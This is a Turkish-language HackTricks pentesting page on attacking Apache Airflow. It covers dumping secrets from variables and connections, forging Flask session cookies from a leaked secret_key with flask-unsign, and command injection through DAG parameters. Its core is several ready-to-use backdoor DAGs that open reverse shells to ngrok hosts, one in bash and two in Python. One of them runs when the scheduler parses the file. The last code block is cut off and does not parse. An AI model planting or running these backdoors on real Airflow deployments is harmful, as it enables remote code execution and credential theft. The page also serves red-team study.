# Apache Airflow Güvenliği

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

### Temel Bilgiler

[**Apache Airflow**](https://airflow.apache.org), **veri boru hatlarını veya iş akışlarını düzenlemek ve zamanlamak için bir platform** olarak hizmet vermektedir. Veri boru hatları bağlamında "orchestrasyon" terimi, çeşitli kaynaklardan gelen karmaşık veri iş akışlarını düzenleme, koordine etme ve yönetme sürecini ifade eder. Bu düzenlenmiş veri boru hatlarının temel amacı, işlenmiş ve tüketilebilir veri setleri sağlamaktır. Bu veri setleri, iş zekası araçları, veri bilimi ve makine öğrenimi modelleri gibi birçok uygulama tarafından yaygın olarak kullanılmaktadır ve bunlar büyük veri uygulamalarının işleyişi için temeldir.

Temelde, Apache Airflow, bir şey (olay, cron) **gerçekleştiğinde kodun çalıştırılmasını zamanlamanıza olanak tanır**.

### Yerel Laboratuvar

#### Docker-Compose

Tam bir apache airflow docker ortamı başlatmak için [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) adresinden **docker-compose yapılandırma dosyasını** kullanabilirsiniz. (Eğer MacOS kullanıyorsanız, docker VM'ye en az 6GB RAM vermeyi unutmayın).

#### Minikube

**Apache Airflow'u çalıştırmanın** kolay bir yolu, **minikube ile çalıştırmaktır**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
### Airflow Yapılandırması

Airflow, yapılandırmasında **hassas bilgileri** saklayabilir veya zayıf yapılandırmalar bulabilirsiniz:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

### Airflow RBAC

Airflow'a saldırmaya başlamadan önce **izinlerin nasıl çalıştığını** anlamalısınız:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

### Saldırılar

#### Web Konsolu Sayımı

Eğer **web konsoluna erişiminiz** varsa, aşağıdaki bilgilerden bazılarına veya hepsine erişim sağlayabilirsiniz:

* **Değişkenler** (Özel hassas bilgiler burada saklanabilir)
* **Bağlantılar** (Özel hassas bilgiler burada saklanabilir)
* `http://<airflow>/connection/list/` adresinden erişin
* [**Yapılandırma**](./#airflow-configuration) (Hassas bilgiler, örneğin **`secret_key`** ve şifreler burada saklanabilir)
* **kullanıcılar & roller** listesini görüntüleyin
* **Her DAG'ın kodu** (ilginç bilgiler içerebilir)

#### Değişken Değerlerini Alma

Değişkenler Airflow'da saklanabilir, böylece **DAG'lar** değerlerine **erişebilir**. Bu, diğer platformların gizli bilgilerine benzer. Eğer **yeterli izinleriniz** varsa, bunlara `http://<airflow>/variable/list/` adresinden GUI'de erişebilirsiniz.\
Airflow varsayılan olarak değişkenin değerini GUI'de gösterir, ancak [**şuna**](https://marclamberti.com/blog/variables-with-apache-airflow/) göre, **değerleri** **yıldızlar** olarak görünecek şekilde **değişkenler listesi** ayarlamak mümkündür.

![](<../../.gitbook/assets/image (164).png>)

Ancak, bu **değerler** hala **CLI** aracılığıyla (DB erişiminiz olmalı), **rastgele DAG** çalıştırarak, **API** ile değişkenler uç noktasına erişerek (API'nin etkinleştirilmesi gerekir) ve **hatta GUI'nin kendisiyle** **alınabilir!**\
Bu değerleri GUI'den erişmek için sadece **erişmek istediğiniz değişkenleri** seçin ve **Eylemler -> Dışa Aktar** seçeneğine tıklayın.\
Başka bir yol, **gizli değere** ulaşmak için **arama filtrelemesi** kullanarak **bruteforce** yapmaktır:

![](<../../.gitbook/assets/image (152).png>)

#### Yetki Yükseltme

Eğer **`expose_config`** yapılandırması **True** olarak ayarlandıysa, **Kullanıcı** rolünden ve **üzerindeki** roller **web'deki yapılandırmayı** **okuyabilir**. Bu yapılandırmada, **`secret_key`** görünür, bu da geçerli bir kullanıcıya sahip olan herkesin **kendi imzalı çerezini oluşturup başka bir kullanıcı hesabını taklit edebileceği** anlamına gelir.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
#### DAG Arka Kapı (Airflow işçi içinde RCE)

Eğer **DAG'ların kaydedildiği** yere **yazma erişiminiz** varsa, sadece **bir tane oluşturabilirsiniz** ve bu size bir **ters kabuk** gönderecektir.\
Bu ters kabuğun bir **airflow işçi konteyneri** içinde çalıştırılacağını unutmayın:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
#### DAG Arka Kapı (Airflow zamanlayıcısında RCE)

Eğer bir şeyi **kodun kökünde çalışacak şekilde ayarlarsanız**, bu yazının yazıldığı anda, **zamanlayıcı tarafından** DAG'ın klasörüne yerleştirildikten birkaç saniye sonra **çalıştırılacaktır**.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
#### DAG Oluşturma

Eğer **DAG kümesindeki bir makineyi ele geçirirseniz**, `dags/` klasöründe yeni **DAG scriptleri** oluşturabilirsiniz ve bunlar **DAG kümesindeki diğer makinelere kopyalanacaktır.**

#### DAG Kod Enjeksiyonu

GUI'den bir DAG çalıştırdığınızda ona **argümanlar** **geçebilirsiniz.**\
Bu nedenle, eğer DAG düzgün kodlanmamışsa **Komut Enjeksiyonuna karşı savunmasız** olabilir.\
Bu, bu CVE'de olan bir durumdur: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

**DAG'lerde komut enjeksiyonları aramaya başlamak için bilmeniz gereken tek şey**, **parametrelerin** **`dag_run.conf.get("param_name")`** kodu ile **erişildiğidir.**

Ayrıca, aynı zafiyet **değişkenlerle** de meydana gelebilir (yeterli ayrıcalıklara sahip olduğunuzda **değişkenlerin değerini GUI'de kontrol edebilirsiniz**). Değişkenler **şu şekilde erişilir:**
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Eğer bir bash komutu içinde kullanılırlarsa, bir komut enjeksiyonu gerçekleştirebilirsiniz.

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
